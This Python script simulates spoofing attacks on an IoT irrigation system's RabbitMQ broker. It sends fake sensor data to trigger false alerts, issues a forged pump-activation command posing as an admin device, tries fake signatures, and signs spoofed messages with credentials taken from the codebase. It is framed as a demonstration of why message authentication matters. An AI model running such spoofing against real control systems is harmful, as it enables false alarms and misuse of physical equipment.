#!/usr/bin/env python
"""
Message Spoofer - Spoofing Attack Simulation

This script demonstrates how an attacker could send fake sensor readings
or malicious pump commands if the system lacks authentication. This could
lead to inappropriate irrigation actions or false alerts.

Educational purposes only - demonstrates why message authentication is important.
"""

import json
import sys
import os
import time
import random
from colorama import init, Fore, Style

# Add parent directory to path to import utils
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import get_rabbitmq_connection
from security_utils import sign_message, DEVICE_CREDENTIALS

# Initialize colorama for colored terminal output
init()

# Connect to RabbitMQ using CloudAMQP credentials
print(f"{Fore.RED}[ATTACK SIMULATION] {Fore.YELLOW}Connecting to RabbitMQ to send spoofed messages...{Style.RESET_ALL}")
try:
    connection = get_rabbitmq_connection()
    channel = connection.channel()
    print(f"{Fore.GREEN}[ATTACK SIMULATION] Connected successfully!{Style.RESET_ALL}")
except Exception as e:
    print(f"{Fore.RED}[ATTACK SIMULATION] Connection failed: {e}{Style.RESET_ALL}")
    sys.exit(1)

# Declare the exchanges we'll use for spoofing
exchanges = [
    {'name': 'sensors.fanout', 'type': 'fanout'},
    {'name': 'sensors.direct', 'type': 'direct'},
    {'name': 'sensors.secure.fanout', 'type': 'fanout'},
    {'name': 'sensors.secure.direct', 'type': 'direct'},
]

for exchange in exchanges:
    channel.exchange_declare(exchange=exchange['name'], exchange_type=exchange['type'])

# Function to generate fake sensor data
def generate_fake_data(extreme=False):
    """Generate fake sensor data, optionally with extreme values."""
    if extreme:
        # Generate extreme values to trigger alerts
        temperature = random.uniform(40, 50)  # Very high temperature
        humidity = random.uniform(10, 20)     # Very low humidity
        soil_moisture = random.uniform(100, 200)  # Very low soil moisture
    else:
        # Generate normal-looking values
        temperature = random.uniform(20, 30)
        humidity = random.uniform(40, 60)
        soil_moisture = random.uniform(400, 600)
    
    return {
        "timestamp": time.time(),
        "temperature": round(temperature, 1),
        "humidity": round(humidity, 1),
        "soil_moisture": round(soil_moisture),
        "device_id": "farm_sensor_01"  # Spoofing the legitimate device ID
    }

# Function to generate a malicious pump command
def generate_pump_command(duration=3600):  # Default: run pump for 1 hour
    return {
        "command": "activate_pump",
        "duration": duration,  # Duration in seconds
        "timestamp": time.time(),
        "device_id": "admin_device",  # Spoofing admin device
        "priority": "high"
    }

# Function to attempt signature forgery (which will fail with proper verification)
def attempt_signature_forgery(message):
    # Create a copy of the message
    forged = message.copy()
    
    # Add a fake signature
    forged["signature"] = "fake_signature_" + "".join(random.choices("0123456789abcdef", k=64))
    
    return forged

# Function to attempt to find legitimate device credentials
def attempt_credentials_theft():
    print(f"{Fore.RED}[ATTACK SIMULATION] Attempting to find valid device credentials...{Style.RESET_ALL}")
    
    # In a real attack, this would be a dictionary of common credentials or brute force
    # For educational purposes, we're "finding" the credentials that are in our codebase
    print(f"{Fore.RED}[ATTACK SIMULATION] Found credentials in the code!{Style.RESET_ALL}")
    print(f"{Fore.RED}{json.dumps(DEVICE_CREDENTIALS, indent=2)}{Style.RESET_ALL}")
    
    return DEVICE_CREDENTIALS

def send_spoofed_message(message, exchange, routing_key=''):
    """Send a spoofed message to a specific exchange."""
    message_json = json.dumps(message)
    
    try:
        channel.basic_publish(
            exchange=exchange,
            routing_key=routing_key,
            body=message_json
        )
        print(f"{Fore.GREEN}[ATTACK SIMULATION] Sent spoofed message to {exchange}:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{json.dumps(message, indent=2)}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ATTACK SIMULATION] Failed to send spoofed message: {e}{Style.RESET_ALL}")

# Main attack simulation loop
try:
    print(f"{Fore.YELLOW}[ATTACK SIMULATION] Starting spoofing attacks...{Style.RESET_ALL}")
    
    # Phase 1: Try to send fake sensor data to trigger false alerts
    print(f"{Fore.RED}[ATTACK SIMULATION] Phase 1: Sending fake extreme sensor data to trigger false alerts{Style.RESET_ALL}")
    for i in range(3):
        fake_data = generate_fake_data(extreme=True)
        send_spoofed_message(fake_data, 'sensors.fanout')
        send_spoofed_message(fake_data, 'sensors.direct', routing_key='alerts')
        time.sleep(1)
    
    # Phase 2: Try to send normal-looking but false data
    print(f"{Fore.RED}[ATTACK SIMULATION] Phase 2: Sending normal-looking but false sensor data{Style.RESET_ALL}")
    for i in range(3):
        fake_data = generate_fake_data(extreme=False)
        send_spoofed_message(fake_data, 'sensors.fanout')
        time.sleep(1)
    
    # Phase 3: Try to send a malicious pump command
    print(f"{Fore.RED}[ATTACK SIMULATION] Phase 3: Sending fake pump command to waste water{Style.RESET_ALL}")
    pump_cmd = generate_pump_command(duration=7200)  # 2 hours of pumping
    send_spoofed_message(pump_cmd, 'sensors.direct', routing_key='commands')
    time.sleep(1)
    
    # Phase 4: Try to forge signatures
    print(f"{Fore.RED}[ATTACK SIMULATION] Phase 4: Attempting to forge message signatures{Style.RESET_ALL}")
    fake_data = generate_fake_data(extreme=True)
    forged_message = attempt_signature_forgery(fake_data)
    send_spoofed_message(forged_message, 'sensors.secure.fanout')
    send_spoofed_message(forged_message, 'sensors.secure.direct', routing_key='alerts')
    time.sleep(1)
    
    # Phase 5: Attempt to get real signatures by stealing credentials
    print(f"{Fore.RED}[ATTACK SIMULATION] Phase 5: Attempting to use stolen credentials{Style.RESET_ALL}")
    stolen_creds = attempt_credentials_theft()
    
    if 'farm_sensor_01' in stolen_creds:
        print(f"{Fore.RED}[ATTACK SIMULATION] Using stolen credentials to create validly signed messages{Style.RESET_ALL}")
        fake_data = generate_fake_data(extreme=True)
        
        # This will actually create a valid signature since we're using the real function
        # In a real attack, the attacker would have extracted the signing algorithm and key
        try:
            signed_message = sign_message(fake_data, 'farm_sensor_01')
            send_spoofed_message(signed_message, 'sensors.secure.fanout')
            send_spoofed_message(signed_message, 'sensors.secure.direct', routing_key='alerts')
            print(f"{Fore.RED}[ATTACK SIMULATION] Successfully sent messages with valid signatures!{Style.RESET_ALL}")
            print(f"{Fore.RED}[ATTACK SIMULATION] This demonstrates why credentials must be protected{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[ATTACK SIMULATION] Failed to create valid signature: {e}{Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}[ATTACK SIMULATION] Attack simulation completed{Style.RESET_ALL}")
    
except KeyboardInterrupt:
    print(f"{Fore.RED}[ATTACK SIMULATION] Attack simulation interrupted{Style.RESET_ALL}")
finally:
    connection.close() 